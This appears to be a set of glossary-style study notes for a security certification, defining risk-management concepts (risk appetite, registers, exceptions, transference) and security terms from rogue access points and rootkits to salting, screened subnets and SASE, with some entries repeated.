One of the benefits of qualitative risk analysis is its simplicity and ease of use. It does not require complex mathematical calculations or extensive data collection, making it a more accessible approach. It allows for a quick initial assessment of risks, enabling organizations to identify and focus on the most significant issues. Qualitative risk analysis frames risks by considering their causes, consequences, and potential interdependencies to improve risk communication and decision-making.

Qualitative risk analysis has some limitations. It is subjective in nature and heavily relies on expert judgment, which often introduces biases and inconsistencies if expert opinions differ. The lack of numerical data in qualitative risk analysis may make communicating risks to stakeholders who prefer quantitative information challenging. Despite these limitations, qualitative risk analysis is important because it provides a simplified description of risks and can help quickly draw attention to significant issues.

Inherent Risk
Risk that an event will pose if no controls are put in place to mitigate it.

The result of a quantitative or qualitative analysis is a measure of inherent risk. Inherent risk is the level of risk before any type of mitigation has been attempted.

In theory, security controls or countermeasures could be introduced to address every risk factor. The difficulty is that security controls can be expensive, so it is important to balance the cost of the control with the cost associated with the risk. It is not possible to eliminate risk; rather the aim is to mitigate risk factors to the point where the organization is exposed only to a level of risk that it can tolerate. The overall status of risk management is referred to as risk posture. Risk posture shows which risk response options can be identified and prioritized. For example, an organization might identify the following priorities:

1. Regulatory requirements to deploy security controls and make demonstrable efforts to reduce risk. Examples of legislation and regulation that mandate risk controls include SOX, HIPAA, Gramm-Leach-Bliley, the Homeland Security Act, PCI DSS regulations, and various personal data protection measures.

2. High value asset, regardless of the likelihood of the threat(s).

3. Threats with high likelihood (that is, high ARO).

4. Procedures, equipment, or software that increase the likelihood of threats (for example, legacy applications, lack of user training, old software versions, unpatched software, running unnecessary services, not having auditing procedures in place, and so on).

Heat Map
Another simple approach is the heat map or "traffic light" impact matrix. For each risk, a simple red, yellow, or green indicator can be put into each column to represent the severity of the risk, its likelihood, cost of controls, and so on. This approach is simplistic but does give an immediate impression of where efforts should be concentrated to improve security.

FIPS 199 discusses how to apply security categorizations (SC) to information systems based on the impact that a breach of confidentiality, integrity, or availability would have on the organization as a whole. Potential impacts can be classified as the following:

1. Low - Minor damage or loss to an asset or loss of performance (though essential functions remain operational).

2. Moderate - Significant damage or loss to assets or performance.

3. High - Major damage or loss or the inability to perform one or more essential functions.
Risk Appetite - A strategic assessment of what level of residual risk is tolerable for an organization.

Risk appetite is a strategic assessment of what level of residual risk is tolerable. Risk appetite is broad in scope. Where risk acceptance has the scope of a single system, risk appetite has a project- or institution-wide scope. Risk appetite is constrained by regulation and compliance.

Levels of Risk Appetite

1. Expansionary - An organization with an expansionary risk appetite is willing to take on higher levels of risk in the pursuit of high returns or aggressive growth. These organizations typically operate in rapidly evolving markets or industries and must take risks to remain competitive. Expansionary risk appetites are associated with organizations launching new products, entering new markets, or making major corporate acquisitions.

2. Conservative - An organization with a conservative risk appetite prioritizes risk avoidance. This type of organization takes a cautious approach to risks and prioritizes preserving cash, maintaining a good reputation, or ensuring regulatory compliance over pursuing aggressive growth.

3. Neutral - An organization with a neutral risk appetite balances expansionary and conservative approaches and is willing to take on risks if they align with strategic objectives and can be managed effectively.
Risk Assessment - The process of identifying risks, analyzing them, developing a response strategy for them, and mitigating their future impact.

Risk assessment is a core component of a cybersecurity program that evaluates previously identified risks to determine their potential impact on the organization. Risk assessment methodologies include ad hoc, recurring, one-time, or continuous. Ad hoc risk assessments are conducted as needed, often in response to specific incidents, such as news of a new, actively exploited zero-day vulnerability or environmental changes such as system upgrades. One-time assessments are comprehensive evaluations carried out at a particular point in time, often during the implementation of a new system (or process) or to obtain an independent assessment of an organization's operational maturity. Recurring risk assessments are scheduled at regular intervals, such as annually, quarterly, or monthly, and can include audits, compliance checks, vulnerability scans, and other types of assessment. Continuous risk assessments constantly evaluate risks and are supported by specialized tools that produce real-time data, such as agent-based vulnerability scanning platforms and intrusion detection systems. Different risk assessment methods are commonly combined to ensure effective identification and management of risk.

Risk assessment is a systematic approach designed to estimate potential risk levels and their significance by interpreting data collected during risk analysis. Risk assessment considers the likelihood of an event occurring and the severity of its consequences. It may also involve prioritizing risks based on their potential impact and defining risk management strategies.
Risk Avoidance - In risk mitigation, the practice of ceasing activity that presents risk.

Avoidance means to stop the activity that is causing risk. For example, a company may develop an internally developed application for managing inventory and then try to sell it. During the sales process, the application may be discovered to have numerous security vulnerabilities that generate complaints and threats of legal action. The company may decide that the cost of maintaining the security of the software is not worth the revenue it generates and its development. Avoidance is infrequently a credible option.
Risk Deterrence / Risk Reduction - In risk mitigation, the response of deploying security controls to reduce the likelihood and/or impact of a threat scenario.

Risk reduction refers to controls that can either make a risk incident less likely or less costly (or perhaps both). For example, if fire is a significant threat, a policy strictly controlling the use of flammable materials on-site reduces likelihood while a system of alarms and sprinklers reduces impact by (hopefully) containing any incident to a small area. Another example is off-site data backup, which provides a remediation option in the event of servers being destroyed by fire.
Risk Exception - A category of risk management that uses alternate mitigating controls to control an accepted risk factor.

A risk exception describes a situation where a risk cannot be mitigated using standard risk management practices or within a specified time frame due to financial, technical, or operational conditions. A risk exception formally recognizes the risk and seeks to identify alternate mitigating controls, if possible. Relevant stakeholders, such as risk managers or senior executives, must approve all risk exceptions. Risk exceptions should be temporary and reviewed on an established time frame to determine whether the risk levels have changed or if the exception can be removed.
Risk Exemption - A category of risk management that accepts an unmitigated risk factor.

A risk exemption is a condition where risk can remain without mitigation, usually due to a strategic business decision. Risk exemptions are generally associated with situations where the cost of mitigating a risk outweighs its potential harm or can lead to significant strategic benefits when accepted. Similarly to risk exceptions, risk exemptions must be formally documented and approved by risk managers or senior executives and periodically reviewed using an established timetable.
Risk Identification - Within overall risk assessment, specific process of listing sources of risk due to threats and vulnerabilities.

Risk identification is fundamental to managing cybersecurity risks. It includes recognizing risks such as malware attacks, phishing attempts, insider threats, equipment failures, software vulnerabilities, and nontechnical risks like inadequate policies or training. Risk identification methods include vulnerability assessments, penetration testing, security audits, threat intelligence, and other methods. Risk identification is the foundation for risk assessment and management practices. Effective risk identification processes allow organizations to make informed decisions regarding resource allocation, risk mitigation strategies, and overall risk management practices.
Risk Impact - The severity of the risk if realized by factors such as the scope, value of the asset, or the financial impacts of the event. It is the severity of the risk if realized as a security incident. This may be determined by factors such as the value of the asset or the cost of disruption if the asset is compromised.
Risk Likelihood - In qualitative risk analysis, the chance of an event that is expressed as a subjectively-determined scale, such as high or low. It is often used in qualitative analysis to describe the chance of a risk event happening subjectively. Likelihood is typically expressed using "low," "medium," and "high" or scored on a scale from 1 to 5.
Risk Management - The cyclical process of identifying, assessing, analyzing, and responding to risks. It is a process for identifying, assessing, and mitigating vulnerabilities and threats to the essential functions that a business must perform to serve its customers.
Risk Management Processes - The cyclical process of identifying, assessing, analyzing, and responding to risks.

Risk management is a process for identifying, assessing, and mitigating vulnerabilities and threats to the essential functions that a business must perform to serve its customers. You can think of this process as being performed over five phases:

1. Identify Mission Essential Functions - Mitigating risk can involve a large amount of expenditure, so it is important to focus efforts. Effective risk management must focus on mission essential functions that could cause the whole business to fail if they are not performed. Part of this process involves identifying critical systems and assets that support these functions.

2. Identify Vulnerabilities - For each function or workflow (starting with the most critical), analyze systems and assets to discover and list any vulnerabilities or weaknesses to which they may be susceptible.

3. Identify Threats - For each function or workflow, identify the threat sources and actors that may take advantage of or exploit or accidentally trigger vulnerabilities.

4. Analyze Business Impacts - The likelihood of a vulnerability being activated as a security incident by a threat and the impact of that incident on critical systems are the factors used to assess risk. There are quantitative and qualitative methods of analyzing impacts and likelihood.

5. Identify Risk Response - For each risk, identify possible countermeasures and assess the cost of deploying additional security controls. Most risks require some sort of mitigation, but other types of response might be more appropriate for certain types and levels of risks.

For each business process and each threat, you must assess the degree of risk that exists. Calculating risk is complex, but the two main variables are likelihood and impact:

1. Likelihood - Is often used in qualitative analysis to describe the chance of a risk event happening subjectively. Likelihood is typically expressed using "low," "medium," and "high" or scored on a scale from 1 to 5.

2. Probability - Is a quantitative measure typically expressed as a numerical value between 0 and 1 or a percentage. Probability aims to precisely measure the chance of a risk event occurring based on statistical methods.

3. Impact - Is the severity of the risk if realized as a security incident. This may be determined by factors such as the value of the asset or the cost of disruption if the asset is compromised.

Risk management is complex and treated very differently in companies and institutions of different sizes, and with different regulatory and compliance requirements. Most companies will institute enterprise risk management (ERM - The comprehensive process of evaluating, measuring, and mitigating the many risks that pervade an organization) policies and procedures, based on frameworks such as NIST's Risk Management Framework (RMF) or ISO 31K. These legislative and framework compliance requirements are often formalized as a Risk and Control Self-Assessment (RCSA). An organization may also contract an external party to lead the process, in which case it is referred to as a Risk and Control Assessment (RCA).

A RCSA is an internal process undertaken by stakeholders to identify risks and the effectiveness with which controls mitigate those risks. RCSAs are often performed through questionnaires and workshops with department managers. The outcome of an RCSA is a report. Up-to-date RCSA reports are critical to the external audit process.

Risk Registers
A document highlighting the results of risk assessments in an easily comprehensible format (such as a "traffic light" grid). Its purpose is for department managers and technicians to understand risks associated with the workflows that they manage.

A risk register is a document showing the results of risk assessments in a comprehensible format and includes information regarding risks, their severity, the associated owner of the risk , and all identified mitigation strategies. The register may include a heat map risk matrix (A graphical table indicating the likelihood and impact of risk factors identified for a workflow, project, or department for reference by stakeholders) with columns for impact and likelihood ratings, date of identification, description, countermeasures, owner/route for escalation, and status.

Risk registers are also commonly depicted as scatterplot graphs, where impact and likelihood are each an axis, and the plot point is associated with a legend that includes more information about the nature of the plotted risk. A risk register should be shared among stakeholders (executives, department managers, and senior technicians) so that they understand the risks associated with the workflows that they manage.

Risk Threshold
Risk threshold defines the limits or levels of acceptable risk an organization is willing to tolerate. The risk threshold represents the boundaries within which risks are considered to be acceptable and manageable. Risk thresholds are based on various factors such as regulatory requirements, organizational objectives, stakeholder expectations, and the organization's risk appetite to help establish clear guidelines for decision-making. Organizations often define different risk thresholds for different types of risks based on their potential impact and criticality.

Key Risk Indicators
Key Risk Indicators (KRIs - The method by which emerging risks are identified and analyzed so that changes can be adopted to proactively avoid issues from occurring) are critical predictive indicators organizations use to monitor and predict potential risks. These metrics provide an early indication of increasing risk exposures in different areas of the organization. KRIs assess the potential impact and likelihood of various risks so leadership teams can take proactive steps to manage them effectively.

Using KRIs is closely associated with risk registers and risk management practices because KRIs provide the data needed to assess the likelihood and potential impact of each risk item tracked in a risk register. For example, a KRI may identify an increasing trend in system downtime due to IT operational issues which impact business operations. Risk managers handle this via a risk register and include details like potential impacts (lost productivity, customer dissatisfaction), mitigation steps (increasing IT resources, improving system redundancy), and the person or team responsible for managing these mitigations.

A risk owner (An individual who is accountable for developing and implementing a risk response strategy for a risk documented in a risk register) refers to the individual responsible for managing a particular risk, including identifying and assessing the risk, implementing measures to mitigate it, monitoring the effectiveness of the measures, and taking corrective actions as warranted. The risk owner has a comprehensive understanding of the risk and its potential impacts and a thorough understanding of the measures needed to manage it. This role is often assigned to leadership team members with the authority to make decisions and the ability to allocate resources for risk mitigation. The risk owner also communicates information about the risk and its status to other stakeholders.

The risk appetite (A strategic assessment of what level of residual risk is tolerable for an organization) describes the level of risk that an organization is willing to accept. The organization's risk appetite is critical in determining which risks are added to a risk register and how they are prioritized. Risks are compared to the organization's risk appetite when identified and assessed. Risk tolerance (Determines the thresholds that separate different levels of risk) describes the specific amount of variance an organization is willing to accept regarding measured risk levels and the established risk appetite. If a risk item's potential impact or likelihood exceeds the organization's risk tolerance, the risk is added to the risk register for appropriate management and monitoring. Risks that exceed the organization's risk tolerance by a large margin are generally prioritized and treated more urgently than other risks. In contrast, if a risk is near or slightly above the tolerance threshold, leadership teams may decide to accept it and monitor it closely.

Levels of Risk Appetite

1. Expansionary - An organization with an expansionary risk appetite is willing to take on higher levels of risk in the pursuit of high returns or aggressive growth. These organizations typically operate in rapidly evolving markets or industries and must take risks to remain competitive. Expansionary risk appetites are associated with organizations launching new products, entering new markets, or making major corporate acquisitions.

2. Conservative - An organization with a conservative risk appetite prioritizes risk avoidance. This type of organization takes a cautious approach to risks and prioritizes preserving cash, maintaining a good reputation, or ensuring regulatory compliance over pursuing aggressive growth.

3. Neutral - An organization with a neutral risk appetite balances expansionary and conservative approaches and is willing to take on risks if they align with strategic objectives and can be managed effectively.

Risk Reporting
A periodic summary of relevant information about a project’s current risks. It provides a summarized overview of known risks, realized risks, and their impact on the organization.

Risk reporting describes the methods used to communicate an organization's risk profile and the effectiveness of its risk management program. Effective risk reporting supports decision-making, highlights concerns, and ensures stakeholders understand the organization's risks. The content of risk reports must be relevant to its intended audience. For example, reports designed for board members must focus on strategic risks and the organization's overall risk appetite. Operational risk reports must include specific details regarding the factors contributing to risk and are appropriate for managers or technical employees. Risk reports must also clearly convey recommended risk responses, such as accepting, mitigating, transferring, or avoiding the risk.
Risk Management Strategies - Risk management strategies describe the proactive and systematic approaches used to identify, assess, prioritize, and mitigate risks to minimize their negative impacts.

Risk mitigation (or risk remediation, it is the response of reducing risk to fit within an organization's willingness to accept risk) is the overall process of reducing exposure to or the effects of risk factors. A countermeasure that reduces exposure to a threat or vulnerability describes risk deterrence (or risk reduction. In risk mitigation, the response of deploying security controls to reduce the likelihood and/or impact of a threat scenario). Risk reduction refers to controls that can either make a risk incident less likely or less costly (or perhaps both). For example, if fire is a significant threat, a policy strictly controlling the use of flammable materials on-site reduces likelihood while a system of alarms and sprinklers reduces impact by (hopefully) containing any incident to a small area. Another example is off-site data backup, which provides a remediation option in the event of servers being destroyed by fire.

Risk Avoidance (In risk mitigation, the practice of ceasing activity that presents risk) means to stop the activity that is causing risk. For example, a company may develop an internally developed application for managing inventory and then try to sell it. During the sales process, the application may be discovered to have numerous security vulnerabilities that generate complaints and threats of legal action. The company may decide that the cost of maintaining the security of the software is not worth the revenue it generates and its development. Avoidance is infrequently a credible option.

Risk Transference
In risk mitigation, the response of moving or sharing the responsibility of risk to another entity, such as by purchasing cybersecurity insurance.

Transference (or risk sharing) means assigning risk to a third party, such as an insurance company. Specific cybersecurity insurance or cyber liability coverage protects against fines and liabilities arising from data breaches and attacks.

Note that in this sort of case it is relatively simple to transfer the obvious risks, but risks to the company's reputation remain. If a customer's credit card details are stolen because they used your unsecure e-commerce application, the customer won't care if you or a third party were nominally responsible for security. It is also unlikely that legal liabilities could be completely transferred in this way. For example, insurance terms are likely to require that best practice risk controls have been implemented.

It is not possible to eliminate risks, so a major objective of risk management is to determine an appropriate level of allowable risk. The concept of "allowable risk" varies greatly between organizations and is dependent on industry sector, leadership style, legal environment, and other factors.

Risk Acceptance
The response of determining that a risk is within the organization's appetite and no countermeasures other than ongoing monitoring is needed.

Risk acceptance (or risk tolerance) means that no countermeasures are put in place because the level of risk does not justify it.

A risk exception (A category of risk management that uses alternate mitigating controls to control an accepted risk factor) describes a situation where a risk cannot be mitigated using standard risk management practices or within a specified time frame due to financial, technical, or operational conditions. A risk exception formally recognizes the risk and seeks to identify alternate mitigating controls, if possible. Relevant stakeholders, such as risk managers or senior executives, must approve all risk exceptions. Risk exceptions should be temporary and reviewed on an established time frame to determine whether the risk levels have changed or if the exception can be removed.

A risk exemption (A category of risk management that accepts an unmitigated risk factor) is a condition where risk can remain without mitigation, usually due to a strategic business decision. Risk exemptions are generally associated with situations where the cost of mitigating a risk outweighs its potential harm or can lead to significant strategic benefits when accepted. Similarly to risk exceptions, risk exemptions must be formally documented and approved by risk managers or senior executives and periodically reviewed using an established timetable.

Residual Risk and Risk Appetite
Where inherent risk is the risk before mitigation, residual risk (Risk that remains even after controls are put into place) is the likelihood and impact after specific mitigation, transference, or acceptance measures have been applied. Risk appetite is a strategic assessment of what level of residual risk is tolerable. Risk appetite is broad in scope. Where risk acceptance has the scope of a single system, risk appetite has a project- or institution-wide scope. Risk appetite is constrained by regulation and compliance.
Risk Mitigation / Risk Remediation - The response of reducing risk to fit within an organization's willingness to accept risk. It is the overall process of reducing exposure to or the effects of risk factors.
Risk Owner - An individual who is accountable for developing and implementing a risk response strategy for a risk documented in a risk register.

A risk owner refers to the individual responsible for managing a particular risk, including identifying and assessing the risk, implementing measures to mitigate it, monitoring the effectiveness of the measures, and taking corrective actions as warranted. The risk owner has a comprehensive understanding of the risk and its potential impacts and a thorough understanding of the measures needed to manage it. This role is often assigned to leadership team members with the authority to make decisions and the ability to allocate resources for risk mitigation. The risk owner also communicates information about the risk and its status to other stakeholders.
Risk Probability - In quantitative risk analysis, the chance of an event that is expressed as a percentage. It is a quantitative measure typically expressed as a numerical value between 0 and 1 or a percentage. Probability aims to precisely measure the chance of a risk event occurring based on statistical methods.
Risk Register - A document highlighting the results of risk assessments in an easily comprehensible format (such as a "traffic light" grid). Its purpose is for department managers and technicians to understand risks associated with the workflows that they manage.

A risk register is a document showing the results of risk assessments in a comprehensible format and includes information regarding risks, their severity, the associated owner of the risk , and all identified mitigation strategies. The register may include a heat map risk matrix (A graphical table indicating the likelihood and impact of risk factors identified for a workflow, project, or department for reference by stakeholders) with columns for impact and likelihood ratings, date of identification, description, countermeasures, owner/route for escalation, and status.

Risk registers are also commonly depicted as scatterplot graphs, where impact and likelihood are each an axis, and the plot point is associated with a legend that includes more information about the nature of the plotted risk. A risk register should be shared among stakeholders (executives, department managers, and senior technicians) so that they understand the risks associated with the workflows that they manage.
Risk Reporting - A periodic summary of relevant information about a project's current risks. It provides a summarized overview of known risks, realized risks, and their impact on the organization.

Risk reporting describes the methods used to communicate an organization's risk profile and the effectiveness of its risk management program. Effective risk reporting supports decision-making, highlights concerns, and ensures stakeholders understand the organization's risks. The content of risk reports must be relevant to its intended audience. For example, reports designed for board members must focus on strategic risks and the organization's overall risk appetite. Operational risk reports must include specific details regarding the factors contributing to risk and are appropriate for managers or technical employees. Risk reports must also clearly convey recommended risk responses, such as accepting, mitigating, transferring, or avoiding the risk.
Risk Threshold - Risk threshold defines the limits or levels of acceptable risk an organization is willing to tolerate. The risk threshold represents the boundaries within which risks are considered to be acceptable and manageable. Risk thresholds are based on various factors such as regulatory requirements, organizational objectives, stakeholder expectations, and the organization's risk appetite to help establish clear guidelines for decision-making. Organizations often define different risk thresholds for different types of risks based on their potential impact and criticality.
Risk Tolerance - A strategic assessment of what level of residual risk is tolerable for an organization.

Vulnerability analysis must align with an organization's risk tolerance. Risk tolerance refers to the level of risk an organization is willing to accept. This can vary greatly depending on the organization's size, industry, regulatory environment, and strategic objectives. By aligning vulnerability analysis with risk tolerance, an organization can ensure its vulnerability management efforts align with its overall risk management strategy.
Risk Transference / Risk Sharing - In risk mitigation, the response of moving or sharing the responsibility of risk to another entity, such as by purchasing cybersecurity insurance.

It means assigning risk to a third party, such as an insurance company. Specific cybersecurity insurance or cyber liability coverage protects against fines and liabilities arising from data breaches and attacks.

Note that in this sort of case it is relatively simple to transfer the obvious risks, but risks to the company's reputation remain. If a customer's credit card details are stolen because they used your unsecure e-commerce application, the customer won't care if you or a third party were nominally responsible for security. It is also unlikely that legal liabilities could be completely transferred in this way. For example, insurance terms are likely to require that best practice risk controls have been implemented.

It is not possible to eliminate risks, so a major objective of risk management is to determine an appropriate level of allowable risk. The concept of "allowable risk" varies greatly between organizations and is dependent on industry sector, leadership style, legal environment, and other factors.
Rogue Access Point (AP) Attack - A rogue access point is one that has been installed on the network without authorization, whether with malicious intent or not. A malicious user can set up such an access point with something as basic as a smartphone with tethering capabilities, and a non-malicious user could enable such an access point by accident. If connected to a local segment, an unauthorized access point creates a backdoor through which to attack the network.

A rogue access point masquerading as a legitimate one is called an evil twin. Each network is identified to users by a service set identifier (SSID) name. An evil twin (A wireless access point that deceives users into believing that it is a legitimate network access point) might use typosquatting or SSID stripping to make the rogue network name appear similar to the legitimate one. Alternatively, the attacker might use some DoS technique to overcome the legitimate access point. In the latter case, they could spoof both the SSID and the basic SSID (BSSID). The BSSID is the MAC address of the access point's radio. The evil twin might be able to harvest authentication information from users entering their credentials by mistake and implement a variety of other on-path attacks, including DNS redirection.

A rogue hardware access point can be identified through physical inspections. There are also various Wi-Fi analyzers and wireless intrusion protection systems that can detect rogue access points. These can log use of typosquatting SSIDs and unknown and duplicate (spoofed) MAC addresses. In an enterprise network, access points are usually connected to switches. Monitoring can detect any that are not and flag them as potential rogues. They may also be able to identify radio hardware and alert if an unauthorized access point brand is detected.
Role-based Access Control (RBAC) - An access control model where resources are protected by ACLs that are managed by administrators and that provide user permissions based on job functions.

Role-based access control (RBAC) means that an organization defines its permission requirements in terms of the tasks that an employee or service must be able to perform. Each set of permissions is a role. Each principal (user or service account) is allocated to one or more roles. Under this system, the right to modify the permissions assigned to each role is reserved to a system owner. Therefore, the system is nondiscretionary as each principal cannot modify the ACL of a resource, even though they can change the resource in other ways. Principals gain rights implicitly (through being assigned to a role) rather than explicitly (being assigned the right directly). Filesystem ACLs, whether on local or networked storage, are where these permissions are stored and enforced.

The concept of a security group account goes some way toward turning a discretionary system into a role-based one. Rather than assigning rights directly to user accounts, the system owner assigns user accounts to security group accounts. Principals gain rights by being made a member of a security group. A principal can be a member of multiple groups and can therefore receive rights and permissions from several sources. This approach can be applied across different operating systems, including both Windows and Unix/Linux environments, to ensure a flexible and scalable permissions management system.

RBAC can be partially implemented by mapping security groups onto roles, but they are not identical schemes. Membership in security groups is largely discretionary (assigned by administrators rather than determined by the system). Also, ideally, a principal should only inherit the permissions of a role to complete a particular task rather than retain them permanently. Administrators should be prevented from escalating their own privileges by assigning roles to their own accounts arbitrarily or boosting a role's permissions.
Root Cause Analysis - A technique used to determine the true cause of the problem that, when removed, prevents the problem from occurring again.
Root Certificate - In PKI, a root certificate is a self-signed certificate that serves as the trust anchor and can issue certificates to intermediate CAs in a hierarchy.

The root certificate is self-signed, meaning the CA server signs a certificate issued to itself. A root certificate uses an RSA key size of 2,048 or 4,096 bits or the ECC equivalent. The subject of the root certificate is set to the organization/CA name, such as "CompTIA Root CA."

The root certificate can be used to sign other certificates issued by the CA. Installing the CA's root certificate means that hosts will automatically trust any certificates signed by that CA.
Root of Trust - The root of trust model defines how users and different CAs can trust one another. Each CA issues itself a self-signed root certificate.
Rooting - Gaining superuser-level access over an Android-based mobile device.

It involves gaining root access or administrative privileges on an Android device to modify system files, install custom ROMs (modified operating system versions), and access features and settings not available to regular users.
Rootkit - Class of malware that modifies system files, often at the kernel level, to conceal its presence.

In Windows, Trojan malware that depends on manual execution by the logged-on user inherits the privileges of that user account. If the account has only standard permissions, the malware will only be able to add, change, or delete files in the user’s profile and to run only apps and commands that the user is permitted to.

If the malware attempts to change system-wide files or settings, it requires local administrator-level privileges. To obtain those through manual installation or execution, the user must be confident enough in the Trojan package to confirm the User Account Control (UAC) prompt or enter the credentials for an administrative user.

If the malware gains local administrator-level privileges, there are still protections in Windows to mitigate abuse of these permissions. Critical processes run with a higher level of privilege called SYSTEM. Consequently, Trojans installed or executed with local administrator privileges cannot conceal their presence entirely and will show up as a running process or service. Often the process image name is configured to resemble a genuine executable or library to avoid detection. For example, a Trojan may use the filename "rund1132.exe" to masquerade as "rundll32.exe." To ensure persistence (running when the computer is restarted), the Trojan may have to use a registry entry or create itself as a service, which can usually be detected easily.

If the malware can be delivered as the payload for an exploit of a severe vulnerability, it may be able to execute without requiring any authorization using SYSTEM privileges. Alternatively, the malware may be able to use an exploit to escalate privileges to SYSTEM level after installation. Malware running with this level of privilege is referred to as a rootkit. The term derives from UNIX/Linux where any process running as the root superuser account has unrestricted access to everything from the root of the file system down.

In theory, there is nothing about the system that a rootkit could not change. In practice, Windows uses other mechanisms to prevent misuse of kernel processes, such as code signing. Consequently, what a rootkit can do depends largely on adversary capability and level of effort. When dealing with a rootkit, you should be aware that there is the possibility that it can compromise system files and programming interfaces, so that local shell processes, such as Explorer, taskmgr, or tasklist on Windows or ps or top on Linux, plus port scanning tools, such as netstat, no longer reveal its presence (at least, if run from the infected machine). A rootkit may also contain tools for cleaning system logs, further concealing its presence.

Software processes can run in one of several "rings." Ring 0 is the most privileged (it provides direct access to hardware) and so should be reserved for kernel processes only. Ring 3 is where user-mode processes run; drivers and I/O processes may run in Ring 1 or Ring 2. This architecture can also be complicated by the use of virtualization.

There are also examples of rootkits that can reside in firmware (either the computer firmware or the firmware of any sort of adapter card, hard drive, removable drive, or peripheral device). These can survive any attempt to remove the rootkit by formatting the drive and reinstalling the OS. For example, the US intelligence agencies have developed DarkMatter and Quark Matter UEFI rootkits targeting the firmware on Apple Macbook laptops.
Router Firewall - A hardware device that has the primary function of a router, but also has firewall functionality embedded into the router firmware. A router firewall or firewall router appliance implements filtering functionality as part of the router firmware. The difference is that a router appliance is primarily designed for routing, with a firewall as a secondary feature. Small Office/Home Office (SOHO) Internet routers /modems come with a firewall built in, for example.
Rule-based Access Control - A nondiscretionary access control technique that is based on a set of operational rules or restrictions to enforce a least privileges permissions policy.

Rule-based access control refers to any sort of access control model where access control policies are determined by system-enforced rules rather than by system users. As such, RBAC, ABAC, and MAC are all examples of rule-based (or nondiscretionary) access control.

Conditional access is an example of rule-based access control. A conditional access system monitors account or device behavior throughout a session. If certain conditions are met, it may suspend the account or may require the user to reauthenticate, perhaps using a two-step verification method.

The User Account Control (UAC) and sudo restrictions on privileged accounts are examples of conditional access. The user is prompted for confirmation or authentication when making requests that require elevated privileges. Role-based rights management and ABAC systems can apply a number of criteria to conditional access, including location-based policies.
Rules of Engagement (RoE) - A definition of how a pen test will be executed and what constraints will be in place. This provides the pen tester with guidelines to consult as they conduct their tests so that they don't have to constantly ask management for permission to do something.

Rules of Engagement (RoE) define the parameters and expectations for vendor relationships. These rules outline the responsibilities, communication methods, reporting mechanisms, security requirements, and compliance obligations that vendors must adhere to. Rules of engagement establish clear guidelines for the vendor's behavior, activities, and access to sensitive information. By setting these boundaries, organizations can establish a controlled and secure environment, mitigating the potential risks associated with third-party relationships. Some important elements included in an RoE include the following:

1. Roles and Responsibilities - Clearly define the roles and responsibilities of the vendor and client in managing risks, including specifying who is responsible for identifying, assessing, and mitigating various types of risks.

2. Security Requirements - Outline the security standards, practices, and controls the vendor must adhere to, including provisions related to data protection, access controls, encryption, incident response, and regular security assessments.

3. Compliance Obligations - State the regulatory and compliance obligations the vendor must meet, ensuring they align with the client's industry-specific requirements, including privacy, data security, and any other applicable legal or industry regulations.

4. Reporting and Communication - Establish protocols for timely reporting of security incidents, breaches, or potential risks, including defining the reporting channels, frequency, and level of detail required to ensure effective risk communication and management.

5. Change Management - Outline procedures for managing changes or updates to systems, processes, or services that could impact security and introduce new risks, including change approval processes, testing requirements, and documentation practices.

6. Contractual Provisions - Include provisions related to indemnification, liability, insurance, and termination rights in case of security breaches or failure to meet risk management obligations. These provisions help allocate responsibilities and provide legal recourse in case of noncompliance or breaches.
Salting - A security countermeasure that mitigates the impact of precomputed hash table attacks by adding a random value to each plaintext input.

Cryptographic hash functions are often used for password storage and transmission. A hash cannot be decrypted back to the plaintext password that generated it. Hash functions are one way. However, passwords stored as hashes are vulnerable to brute force and dictionary attacks.

A threat actor can generate hashes to try to find a match for a hash captured from network traffic or a password file. A brute force attack simply runs through every possible combination of letters, numbers, and symbols. A dictionary attack creates hashes of common words and phrases.

Both these attacks can be slowed down by adding a salt value when creating the hash. A salted hash is computed as follows:

(salt + password) * SHA = hash

A unique, random salt value should be generated for each user account. This mitigates the risk that if users choose identical plaintext passwords, there would be identical hash values in the password file. The salt is not kept secret, because any system verifying the hash must know the value of the salt. It simply means that an attacker cannot use precomputed tables of hashes. The hash values must be recompiled with the specific salt value for each password.
Sandbox Execution - If malicious activity is not detected by endpoint protection, analyze the suspect code or host in a sandboxed environment. A sandbox is a system configured to be completely isolated from the production network so that the malware cannot "break out." The sandbox will be designed to record file system and registry changes plus network activity. Similarly, a sheep dip is an isolated host used to test new software and removable media for malware indicators before it is authorized on the production network.
Sarbanes-Oxley Act (SOX) - A law enacted in 2002 that dictates requirements for the storage and retention of documents relating to an organization's financial and business operations.

In the United States , the Sarbanes-Oxley Act (SOX) mandates the implementation of risk assessments, internal controls, and audit procedures.
Scareware - Scareware refers to malware that displays alarming messages, often disguised to look like genuine OS alert boxes. Scareware attempts to alarm the user by suggesting that the computer is infected or has been hijacked.
Screened Subnet - A segment isolated from the rest of a private network by one or more firewalls that accepts connections from the Internet over designated ports.

A screened subnet, also known as a perimeter network, creates an additional layer of protection between an organization's internal network and the Internet. A screened subnet acts as a neutral zone, separating public-facing servers from sensitive internal network resources to reduce the exposure of the internal network resource to external threats. In practical terms, the screened subnet often hosts web, email, DNS, or FTP services. These systems must typically be accessible from the public Internet but isolated from sensitive internal systems to limit the impact of a breach of one of these services. By placing these servers in the screened subnet, an organization can limit the damage if these servers are compromised.

Firewalls are typically used to create and control the traffic to and from the screened subnet. The first firewall, between the Internet and the screened subnet, is configured to allow traffic to the services hosted in the screened subnet. The second firewall, between the screened subnet and the internal network, is configured to block most (practically all) traffic from the screened subnet to the internal network. A screened subnet is a fundamental part of a network's security architecture and an important example of network segmentation as a type of security control.
Secret Data - This level of classification refers to information that, if disclosed, could cause serious damage to national security. Viewing is restricted to individuals with a need to know.
Secure Access Service Edge (SASE) - A networking and security architecture that provides secure access to cloud applications and services while reducing complexity. It combines security services like firewalls, identity and access management, and secure web gateway with networking services such as SD-WAN.

Secure Access Service Edge (SASE) combines the protection of a secure access platform with the agility of a cloud-delivered security architecture. SASE offers a centralized approach to security and access, providing end-to-end protection and streamlining the process of granting secure access to all users, regardless of location. SASE is a network architecture that combines wide area networking (WAN) technologies and cloud-based security services to provide secure access to cloud-based applications and services.

SASE offers several security features to help organizations protect their networks and data as SASE operates under a zero trust security model. SASE incorporates Identity and Access Management (IAM) and assumes all users and devices are untrusted until they are authenticated and authorized. SASE also provides a range of threat prevention features, such as intrusion prevention, malware protection, and content filtering.
Secure Administrative Workstation (SAW) - A secure administrative workstation (SAW) is a computer with a very low attack surface running the minimum possible apps.
Secure Baseline - Configuration guides, benchmarks, and best practices for deploying and maintaining a network device or application server in a secure state for its given role.

